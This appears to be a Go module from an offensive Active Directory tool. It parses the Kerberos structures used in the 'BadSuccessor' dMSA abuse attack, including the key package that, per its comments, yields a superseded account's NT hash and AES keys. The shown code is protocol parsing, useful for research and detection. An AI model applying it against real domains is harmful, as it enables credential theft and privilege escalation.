// Package dmsa implements the pure Kerberos side of the BadSuccessor
// attack (dMSA abuse, Akamai's Yuval Gordon, May 2025): the structures a
// Windows Server 2025 KDC introduced for delegated Managed Service
// Accounts and the client-side derivation built on them.
//
// Two MS-KILE structures matter:
//
//   - KERB-SUPERSEDED-BY-USER (MS-KILE 2.2.13, PA-DATA type 170): sent in
//     KRB-ERROR e-data when an account that has been migrated to a dMSA
//     authenticates — it names the successor dMSA the client should retry
//     as.
//   - KERB-DMSA-KEY-PACKAGE (MS-KILE 2.2.14, PA-DATA type 171): returned
//     in the encrypted-pa-data of the TGS-REP when an authorized client
//     (one listed in the dMSA's msDS-GroupMSAMembership) requests a TGT
//     for the dMSA via an S4U2Self-style TGS-REQ to the krbtgt service.
//     current-keys are the dMSA's own managed keys; previous-keys are the
//     superseded account's keys, limited to the encryption types that
//     account supported (RC4-HMAC is always present — it is unsalted), so
//     the package hands the caller the superseded account's NT hash and
//     AES keys directly.
//
// The package also builds the PA-S4U-X509-USER pre-auth data that makes
// the KDC emit the key package (SIGN_REPLY | UNCONDITIONAL_DELEGATION,
// per MS-SFU 2.2.2 and Rubeus' dMSA support) and assembles/parses the
// surrounding TGS exchange. All functions are pure byte/crypto
// transforms; every network exchange lives in internal/smbclient.
//
// Verification status (July 2026): the request construction is
// byte-identical to impacket's merged -dmsa implementation
// (fortra/impacket PR #2010) for AES256 session keys, and both
// implementations draw the identical refusal (KRB_AP_ERR_BADMATCH) from a
// Windows Server 2022 KDC — dMSA is Server 2025-only, so the success
// path is verified against documentation and reference implementations,
// not a live KDC.
package dmsa

import (
	"encoding/asn1"
	"fmt"
	"time"
)

// PA-DATA type numbers introduced for dMSA (MS-KILE 2.2.13 / 2.2.14).
// Windows delivers both inside PA-DATA sequences: type 170 in KRB-ERROR
// e-data, type 171 in the TGS-REP enc-part's encrypted-pa-data [12].
const (
	PADataTypeSupersededByUser = 170
	PADataTypeDMSAKeyPackage   = 171
)

// Kerberos encryption types anvil reports on (RFC 3962 / RFC 4757).
const (
	ETypeAES128 = 17
	ETypeAES256 = 18
	ETypeRC4    = 23
)

// EncryptionKey is one Kerberos key: an etype and its raw key bytes.
type EncryptionKey struct {
	Type  int32
	Value []byte
}

// KeyPackage is a parsed KERB-DMSA-KEY-PACKAGE (MS-KILE 2.2.14):
//
//	KERB-DMSA-KEY-PACKAGE ::= SEQUENCE {
//	    current-keys        [0] SEQUENCE OF EncryptionKey,
//	    previous-keys       [1] SEQUENCE OF EncryptionKey OPTIONAL,
//	    expiration-interval [2] KerberosTime,
//	    fetch-interval      [4] KerberosTime,   -- tag 4, not 3
//	    ...
//	}
type KeyPackage struct {
	CurrentKeys        []EncryptionKey // the dMSA's own (managed) keys
	PreviousKeys       []EncryptionKey // the superseded account's keys
	ExpirationInterval time.Time       // after this the KDC will have new keys
	FetchInterval      time.Time       // after this the KDC may have new keys
}

// ParseKeyPackage decodes a KERB-DMSA-KEY-PACKAGE (the padata-value of a
// type-171 PA-DATA). previous-keys is OPTIONAL (absent for standalone
// dMSAs that never superseded an account).
func ParseKeyPackage(der []byte) (*KeyPackage, error) {
	var seq asn1.RawValue
	rest, err := asn1.Unmarshal(der, &seq)
	if err != nil {
		return nil, fmt.Errorf("KERB-DMSA-KEY-PACKAGE: %v", err)
	}
	if len(rest) != 0 {
		return nil, fmt.Errorf("KERB-DMSA-KEY-PACKAGE: %d trailing bytes", len(rest))
	}
	if seq.Class != asn1.ClassUniversal || seq.Tag != asn1.TagSequence || !seq.IsCompound {
		return nil, fmt.Errorf("KERB-DMSA-KEY-PACKAGE: expected SEQUENCE, got class %d tag %d", seq.Class, seq.Tag)
	}

	p := &KeyPackage{}
	seen := 0
	for body := seq.Bytes; len(body) > 0; {
		var field asn1.RawValue
		body, err = asn1.Unmarshal(body, &field)
		if err != nil {
			return nil, fmt.Errorf("KERB-DMSA-KEY-PACKAGE field: %v", err)
		}
		if field.Class != asn1.ClassContextSpecific {
			return nil, fmt.Errorf("KERB-DMSA-KEY-PACKAGE: expected context tag, got class %d tag %d", field.Class, field.Tag)
		}
		switch field.Tag {
		case 0:
			keys, err := parseKeyList(field.Bytes)
			if err != nil {
				return nil, fmt.Errorf("current-keys: %v", err)
			}
			p.CurrentKeys = keys
			seen++
		case 1:
			keys, err := parseKeyList(field.Bytes)
			if err != nil {
				return nil, fmt.Errorf("previous-keys: %v", err)
			}
			p.PreviousKeys = keys
		case 2:
			if err := unmarshalKrbTime(field.Bytes, &p.ExpirationInterval); err != nil {
				return nil, fmt.Errorf("expiration-interval: %v", err)
			}
		case 4:
			if err := unmarshalKrbTime(field.Bytes, &p.FetchInterval); err != nil {
				return nil, fmt.Errorf("fetch-interval: %v", err)
			}
			// tags 3+ are reserved for future use (the "..." in MS-KILE);
			// skip anything else for forward compatibility.
		}
	}
	if seen == 0 {
		return nil, fmt.Errorf("KERB-DMSA-KEY-PACKAGE: no current-keys")
	}
	return p, nil
}

// Marshal encodes the package back to DER. It exists so tests can
// round-trip and so fixtures can be generated; the KDC never consumes
// client-marshaled packages.
func (p *KeyPackage) Marshal() []byte {
	out := derExplicit(0, marshalKeyList(p.CurrentKeys))
	if len(p.PreviousKeys) > 0 {
		out = append(out, derExplicit(1, marshalKeyList(p.PreviousKeys))...)
	}
	out = append(out, derExplicit(2, derGeneralizedTime(p.ExpirationInterval))...)
	out = append(out, derExplicit(4, derGeneralizedTime(p.FetchInterval))...)
	return derSeq(out)
}

// parseKeyList decodes a SEQUENCE OF EncryptionKey (KERB-KEY-LIST-REP,
// MS-KILE 2.2.12). Empty sequences yield an empty list.
func parseKeyList(der []byte) ([]EncryptionKey, error) {
	var seq asn1.RawValue
	if _, err := asn1.Unmarshal(der, &seq); err != nil {
		return nil, err
	}
	if seq.Class != asn1.ClassUniversal || seq.Tag != asn1.TagSequence {
		return nil, fmt.Errorf("expected SEQUENCE OF EncryptionKey")
	}
	var keys []EncryptionKey
	for body := seq.Bytes; len(body) > 0; {
		var raw asn1.RawValue
		var err error
		body, err = asn1.Unmarshal(body, &raw)
		if err != nil {
			return nil, err
		}
		key, err := parseEncryptionKey(raw.FullBytes)
		if err != nil {
			return nil, err
		}
		keys = append(keys, key)
	}
	return keys, nil
}

// parseEncryptionKey decodes one EncryptionKey SEQUENCE:
//
//	EncryptionKey ::= SEQUENCE {
//	    keytype  [0] Int32,
//	    keyvalue [1] OCTET STRING
//	}
func parseEncryptionKey(der []byte) (EncryptionKey, error) {
	var k struct {
		Type  int32  `asn1:"explicit,tag:0"`
		Value []byte `asn1:"explicit,tag:1"`
	}
	if _, err := asn1.Unmarshal(der, &k); err != nil {
		return EncryptionKey{}, err
	}
	return EncryptionKey{Type: k.Type, Value: k.Value}, nil
}

// marshalKeyList encodes a SEQUENCE OF EncryptionKey.
func marshalKeyList(keys []EncryptionKey) []byte {
	var out []byte
	for _, k := range keys {
		out = append(out, derSeq(
			append(derExplicit(0, derInt(int64(k.Type))),
				derExplicit(1, derOctetString(k.Value))...))...)
	}
	return derSeq(out)
}

// unmarshalKrbTime decodes a KerberosTime (GeneralizedTime) into *t.
func unmarshalKrbTime(der []byte, t *time.Time) error {
	var gt time.Time
	if _, err := asn1.UnmarshalWithParams(der, &gt, "generalized"); err != nil {
		return err
	}
	*t = gt
	return nil
}

// FindKey returns the first key of the given encryption type.
func FindKey(keys []EncryptionKey, etype int32) ([]byte, bool) {
	for _, k := range keys {
		if k.Type == etype {
			return k.Value, true
		}
	}
	return nil, false
}

// ETypeName renders an encryption type as impacket/hashcat-style text.
func ETypeName(t int32) string {
	switch t {
	case ETypeRC4:
		return "rc4_hmac"
	case ETypeAES128:
		return "aes128_cts_hmac_sha1_96"
	case ETypeAES256:
		return "aes256_cts_hmac_sha1_96"
	default:
		return fmt.Sprintf("etype %d", t)
	}
}

// SupersededByUser is a parsed KERB-SUPERSEDED-BY-USER (MS-KILE 2.2.13):
//
//	KERB-SUPERSEDED-BY-USER ::= SEQUENCE {
//	    name  [0] PrincipalName,
//	    realm [1] Realm,
//	    ...
//	}
//
// The KDC sends it in KRB-ERROR e-data when the requested principal has
// been superseded by a dMSA, so the client knows what to authenticate as.
type SupersededByUser struct {
	Name  []string // PrincipalName components (usually one: the dMSA's sAMAccountName)
	Realm string
}

// String renders the successor as REALM\name.
func (s *SupersededByUser) String() string {
	if s == nil || len(s.Name) == 0 {
		return ""
	}
	return s.Realm + `\` + s.Name[0]
}

// ParseSupersededByUser decodes a KERB-SUPERSEDED-BY-USER (the
// padata-value of a type-170 PA-DATA).
func ParseSupersededByUser(der []byte) (*SupersededByUser, error) {
	var seq asn1.RawValue
	rest, err := asn1.Unmarshal(der, &seq)
	if err != nil {
		return nil, fmt.Errorf("KERB-SUPERSEDED-BY-USER: %v", err)
	}
	if len(rest) != 0 {
		return nil, fmt.Errorf("KERB-SUPERSEDED-BY-USER: %d trailing bytes", len(rest))
	}
	if seq.Class != asn1.ClassUniversal || seq.Tag != asn1.TagSequence || !seq.IsCompound {
		return nil, fmt.Errorf("KERB-SUPERSEDED-BY-USER: expected SEQUENCE")
	}

	s := &SupersededByUser{}
	for body := seq.Bytes; len(body) > 0; {
		var field asn1.RawValue
		body, err = asn1.Unmarshal(body, &field)
		if err != nil {
			return nil, fmt.Errorf("KERB-SUPERSEDED-BY-USER field: %v", err)
		}
		if field.Class != asn1.ClassContextSpecific {
			return nil, fmt.Errorf("KERB-SUPERSEDED-BY-USER: expected context tag, got class %d", field.Class)
		}
		switch field.Tag {
		case 0: // PrincipalName
			var pn struct {
				NameType   int32    `asn1:"explicit,tag:0"`
				NameString []string `asn1:"generalstring,explicit,tag:1"`
			}
			if _, err := asn1.Unmarshal(field.Bytes, &pn); err != nil {
				return nil, fmt.Errorf("name: %v", err)
			}
			s.Name = pn.NameString
		case 1: // Realm (GeneralString)
			if _, err := asn1.UnmarshalWithParams(field.Bytes, &s.Realm, "generalstring"); err != nil {
				return nil, fmt.Errorf("realm: %v", err)
			}
		}
	}
	if len(s.Name) == 0 {
		return nil, fmt.Errorf("KERB-SUPERSEDED-BY-USER: no name")
	}
	return s, nil
}

// Marshal encodes the structure back to DER (tests/fixtures only — the
// KDC is the only legitimate producer).
func (s *SupersededByUser) Marshal() []byte {
	var nameInner []byte
	nameInner = append(nameInner, derExplicit(0, derInt(1))...) // NT_PRINCIPAL
	var strs []byte
	for _, n := range s.Name {
		strs = append(strs, derGeneralString(n)...)
	}
	nameInner = append(nameInner, derExplicit(1, derSeq(strs))...)
	return derSeq(
		append(derExplicit(0, derSeq(nameInner)),
			derExplicit(1, derGeneralString(s.Realm))...))
}

// ExtractSupersededByUser finds a type-170 PA-DATA inside KRB-ERROR
// e-data. Windows wraps e-data payloads as METHOD-DATA (SEQUENCE OF
// PA-DATA):
//
//	PA-DATA ::= SEQUENCE {
//	    padata-type  [1] Int32,
//	    padata-value [2] OCTET STRING
//	}
//
// Returns nil when the error carries no superseded hint (any non-dMSA
// KRB-ERROR).
func ExtractSupersededByUser(edata []byte) *SupersededByUser {
	var seq asn1.RawValue
	if _, err := asn1.Unmarshal(edata, &seq); err != nil {
		return nil
	}
	if seq.Class != asn1.ClassUniversal || seq.Tag != asn1.TagSequence {
		return nil
	}
	for body := seq.Bytes; len(body) > 0; {
		var pa asn1.RawValue
		var err error
		body, err = asn1.Unmarshal(body, &pa)
		if err != nil {
			return nil
		}
		typ, val, ok := splitPAData(pa.Bytes)
		if !ok || typ != PADataTypeSupersededByUser {
			continue
		}
		if s, err := ParseSupersededByUser(val); err == nil {
			return s
		}
	}
	return nil
}

// splitPAData extracts padata-type and padata-value from one PA-DATA
// element's content octets.
func splitPAData(content []byte) (typ int32, val []byte, ok bool) {
	for body := content; len(body) > 0; {
		var field asn1.RawValue
		var err error
		body, err = asn1.Unmarshal(body, &field)
		if err != nil || field.Class != asn1.ClassContextSpecific {
			return 0, nil, false
		}
		switch field.Tag {
		case 1:
			var t int32
			if _, err := asn1.Unmarshal(field.Bytes, &t); err != nil {
				return 0, nil, false
			}
			typ = t
		case 2:
			var v []byte
			if _, err := asn1.Unmarshal(field.Bytes, &v); err != nil {
				return 0, nil, false
			}
			val = v
		}
	}
	return typ, val, len(val) > 0
}
